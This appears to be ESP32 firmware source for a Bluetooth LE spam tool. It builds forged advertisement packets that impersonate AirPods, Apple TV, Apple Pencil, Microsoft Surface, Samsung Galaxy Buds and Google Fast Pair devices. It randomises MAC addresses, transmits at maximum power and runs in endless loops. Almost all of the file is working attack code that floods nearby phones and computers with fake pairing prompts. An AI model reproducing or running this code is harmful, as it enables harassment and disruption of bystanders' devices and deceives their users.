#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include <globals.h>

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

BLEAdvertising *pAdvertising;

enum EBLEPayloadType { 
    Microsoft = 0, 
    SourApple = 1, 
    AppleJuice = 2, 
    Samsung = 3, 
    Google = 4,
    Apple_Fixed = 5,
    AirPods_Pro_2 = 6
};

const uint8_t IOS1[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16};
const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};

struct DeviceType { uint32_t value; };
struct WatchModel { uint8_t value; };

const DeviceType android_models[] = {
    {0xCD8256}, {0x92BBBD}, {0x821F66}, {0xD446A7}, {0x2D7A23}, {0x0E30C3},
    {0xD99CA1}, {0xB37A62}
};

const WatchModel watch_models[] = {
    {0x11}, {0x12}, {0x13}, {0x15}, {0x16}, {0x1B}, {0x1C}, {0x1D}
};

static uint8_t apple_device_id[3] = {0x12, 0x34, 0x56};
static uint8_t apple_watch_model = 0x1B;
static bool apple_signatures_initialized = false;

void initializeAppleSignatures() {
    if (!apple_signatures_initialized) {
        esp_fill_random(apple_device_id, 3);
        apple_watch_model = watch_models[random(sizeof(watch_models) / sizeof(watch_models[0]))].value;
        apple_signatures_initialized = true;
    }
}

void generateRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
        if (i == 0) mac[i] = (mac[i] | 0xF0) & 0xFE;
    }
}

int android_models_count = sizeof(android_models) / sizeof(android_models[0]);

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t packet[50];
    int packet_len = 0;

    switch (Type) {
        case Microsoft: {
            const uint8_t swiftpair[] = {
                0x02, 0x01, 0x06,
                0x08, 0x09, 'S', 'u', 'r', 'f', 'a', 'c', 'e',
                0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
                0x02, 0x0A, 0xC5
            };
            memcpy(packet, swiftpair, sizeof(swiftpair));
            packet_len = sizeof(swiftpair);
            break;
        }
        case AppleJuice: {
            if (random(2) == 0) {
                const uint8_t airpods[] = {
                    0x1a, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
                    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                    apple_device_id[0], apple_device_id[1], apple_device_id[2],
                    0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00
                };
                memcpy(packet, airpods, sizeof(airpods));
                packet_len = sizeof(airpods);
            } else {
                const uint8_t appletv[] = {
                    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                    0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01,
                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10,
                    0x00, 0x00, 0x00
                };
                memcpy(packet, appletv, sizeof(appletv));
                packet_len = sizeof(appletv);
            }
            break;
        }
        case SourApple: {
            uint8_t sour[] = {
                16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01,
                apple_device_id[0], apple_device_id[1], apple_device_id[2],
                0x00, 0x00, 0x10,
                0x00, 0x00, 0x00
            };
            memcpy(packet, sour, sizeof(sour));
            packet_len = sizeof(sour);
            break;
        }
        case Apple_Fixed: {
            initializeAppleSignatures();
            const uint8_t apple_pencil[] = {
                0x16, 0xff, 0x4c, 0x00, 0x0c, 0x0e, 0x0a, 0x0f,
                apple_device_id[0], apple_device_id[1], apple_device_id[2],
                0x0d, 0x00, 0x00, 0x00, 0x10,
                0x02, 0x01, 0x1a, 0x03, 0x03, 0x6f, 0xfe
            };
            memcpy(packet, apple_pencil, sizeof(apple_pencil));
            packet_len = sizeof(apple_pencil);
            break;
        }
        case AirPods_Pro_2: {
            initializeAppleSignatures();
            const uint8_t airpods_pro_2[] = {
                0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02,
                0x20, 0x0d, 0x05, 0x0c, 0x93, 0x32, 0x01, 0xcb,
                apple_device_id[0], apple_device_id[1], apple_device_id[2],
                0x8f, 0x64, 0xc4, 0x78, 0x25,
                0x10, 0x02, 0x00, 0x00, 0x00
            };
            memcpy(packet, airpods_pro_2, sizeof(airpods_pro_2));
            packet_len = sizeof(airpods_pro_2);
            break;
        }
        case Samsung: {
            uint8_t samsung[] = {
                0x1B, 0xFF, 0x75, 0x00,
                0x02, 0x01, 0x06,
                0x03, 0x03, 0xBB, 0xFE,
                0x11, 0x16, 0xBB, 0xFE,
                apple_device_id[0], apple_device_id[1], apple_device_id[2], 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x01, 0x00
            };
            memcpy(packet, samsung, sizeof(samsung));
            packet_len = sizeof(samsung);
            break;
        }
        case Google: {
            uint32_t model = android_models[random(android_models_count)].value;
            uint8_t google[] = {
                0x10, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x64, 0x64, 0x20, 0x01,
                0x00, 0x00, 0x00, 0x00
            };
            memcpy(packet, google, sizeof(google));
            packet_len = sizeof(google);
            break;
        }
    }

    if (packet_len > 0) {
#ifdef NIMBLE_V2_PLUS
        AdvData.addData(packet, packet_len);
#else
        AdvData.addData(std::string((char *)packet, packet_len));
#endif
    }

    return AdvData;
}

void executeIOSFriendlySpam(EBLEPayloadType type) {
    initializeAppleSignatures();
    
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    const char* deviceName = "";
    switch(type) {
        case AppleJuice: deviceName = "AirPods"; break;
        case SourApple: deviceName = "AppleTV"; break;
        case Microsoft: deviceName = "Surface"; break;
        case Samsung: deviceName = "GalaxyBuds"; break;
        case Google: deviceName = "PixelBuds"; break;
        case Apple_Fixed: deviceName = "Apple Pencil"; break;
        case AirPods_Pro_2: deviceName = "AirPods Pro"; break;
    }

    BLEDevice::init(deviceName);
    vTaskDelay(20 / portTICK_PERIOD_MS);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();

    advertisementData.setFlags(0x1A);
    scanResponseData.setName(deviceName);

    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(scanResponseData);

    pAdvertising->setMinInterval(0x60);
    pAdvertising->setMaxInterval(0xA0);

    pAdvertising->start();
    vTaskDelay(200 / portTICK_PERIOD_MS);

    pAdvertising->stop();
    vTaskDelay(20 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void executeAndroidFriendlySpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    const char* deviceName = "";
    switch(type) {
        case Microsoft: deviceName = "Surface"; break;
        case Samsung: deviceName = "GalaxyBuds"; break;
        case Google: deviceName = "PixelBuds"; break;
        default: deviceName = "Device"; break;
    }

    BLEDevice::init(deviceName);
    vTaskDelay(10 / portTICK_PERIOD_MS);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();

    advertisementData.setFlags(0x06);
    scanResponseData.setName(deviceName);

    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(scanResponseData);

    pAdvertising->setMinInterval(0x30);
    pAdvertising->setMaxInterval(0x60);

    pAdvertising->start();
    vTaskDelay(150 / portTICK_PERIOD_MS);

    pAdvertising->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void executeSpam(EBLEPayloadType type) {
    if (type == AppleJuice || type == SourApple || 
        type == Apple_Fixed || type == AirPods_Pro_2) {
        executeIOSFriendlySpam(type);
    } else if (type == Microsoft || type == Samsung || type == Google) {
        executeAndroidFriendlySpam(type);
    } else {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr);

        const char* deviceName = "Device";

        BLEDevice::init(deviceName);
        vTaskDelay(10 / portTICK_PERIOD_MS);

        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

        pAdvertising = BLEDevice::getAdvertising();
        BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
        BLEAdvertisementData scanResponseData = BLEAdvertisementData();

        advertisementData.setFlags(0x06);
        scanResponseData.setName(deviceName);

        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->setScanResponseData(scanResponseData);

        pAdvertising->setMinInterval(0x80);
        pAdvertising->setMaxInterval(0x100);

        pAdvertising->start();
        vTaskDelay(350 / portTICK_PERIOD_MS);

        pAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
        esp_bt_controller_deinit();
#else
        BLEDevice::deinit();
#endif
    }
}

void executeCustomSpam(String spamName) {
    uint8_t macAddr[6];
    for (int i = 0; i < 6; i++) {
        macAddr[i] = esp_random() & 0xFF;
    }
    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE;

    esp_base_mac_addr_set(macAddr);

    String deviceName = spamName;
    if (!deviceName.endsWith(" Pro") && !deviceName.endsWith(" Max")) {
        deviceName += " Pro";
    }

    BLEDevice::init(deviceName.c_str());
    vTaskDelay(10 / portTICK_PERIOD_MS);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();

    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);
    advertisementData.setName(deviceName.c_str());

    pAdvertising->setAdvertisementData(advertisementData);

    pAdvertising->setMinInterval(0x30);
    pAdvertising->setMaxInterval(0x60);

    pAdvertising->start();
    vTaskDelay(150 / portTICK_PERIOD_MS);

    pAdvertising->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    BLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(ManufacturerId);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));

    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();

    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());

    pAdvertising->setAdvertisementData(advertisementData);

    drawMainBorderWithTitle("iBeacon");
    padprintln("");
    padprintln("UUID:" + String(BEACON_UUID));
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        pAdvertising->start();
        vTaskDelay(20 / portTICK_PERIOD_MS);
        pAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void aj_adv(int ble_choice) {
    int mael = 0;
    int count = 0;
    String spamName = "";

    if (ble_choice == 6) {
        spamName = keyboard("", 10, "Name to spam");
    }

    if (ble_choice == 9) {
        ibeacon("iOS Beacon", "E2C56DB5-DFFB-48D2-B060-D0F5A71096E0", 0x004C);
        return;
    }

    while (1) {
        switch (ble_choice) {
            case 0:
                displayTextLine("Applejuice (" + String(count) + ")");
                executeSpam(AppleJuice);
                break;
            case 1:
                displayTextLine("SourApple (" + String(count) + ")");
                executeSpam(SourApple);
                break;
            case 2:
                displayTextLine("SwiftPair (" + String(count) + ")");
                executeSpam(Microsoft);
                break;
            case 3:
                displayTextLine("Samsung (" + String(count) + ")");
                executeSpam(Samsung);
                break;
            case 4:
                displayTextLine("Android (" + String(count) + ")");
                executeSpam(Google);
                break;
            case 5:
                displayTextLine("Spam All (" + String(count) + ")");
                switch(mael % 7) {
                    case 0: executeSpam(Google); break;
                    case 1: executeSpam(Samsung); break;
                    case 2: executeSpam(Microsoft); break;
                    case 3: executeSpam(SourApple); break;
                    case 4: executeSpam(AppleJuice); break;
                    case 5: executeSpam(Apple_Fixed); break;
                    case 6: executeSpam(AirPods_Pro_2); break;
                }
                mael++;
                break;
            case 6:
                displayTextLine(spamName + " (" + String(count) + ")");
                executeCustomSpam(spamName);
                break;
            case 7:
                displayTextLine("Apple Fixed (" + String(count) + ")");
                executeSpam(Apple_Fixed);
                break;
            case 8:
                displayTextLine("AirPods Pro 2 (" + String(count) + ")");
                executeSpam(AirPods_Pro_2);
                break;
        }
        count++;

        vTaskDelay(250 / portTICK_PERIOD_MS);

        if (check(EscPress)) {
            returnToMenu = true;
            break;
        }
    }

    BLEDevice::init("");
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pAdvertising = nullptr;
    vTaskDelay(100 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}
